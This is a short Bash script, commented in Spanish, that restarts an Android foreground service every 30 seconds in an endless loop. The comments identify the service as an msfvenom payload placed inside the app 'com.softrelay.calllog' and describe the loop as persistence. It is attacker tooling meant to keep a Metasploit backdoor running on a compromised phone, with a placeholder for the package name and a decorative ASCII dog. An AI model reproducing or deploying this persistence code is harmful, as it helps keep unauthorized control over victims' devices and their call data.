#!/bin/bash

# Script de persistencia para lanzar un servicio en segundo plano de forma repetitiva

# Explicación:
# Este script ejecutará el servicio 'Lojcn'(msfvenom payload) de la app 'com.softrelay.calllog' de manera continua
# Cada 30 segundos, el servicio será reiniciado para mantener la persistencia.

# Bucle infinito para mantener el servicio en ejecución
while :
do
    # Inicia el servicio 'Lojcn' como un servicio en primer plano
    am start-foreground-service --user 0 -n #com.softrelay.calllog/.cwbtl.Lojcn <- MODIFICAR PAQUETE
#           __ !
#      (___()'`;
#      /,    /`
#jgs   \\"--\\
    # Espera 30 segundos antes de reiniciar el servicio
    sleep 30
done
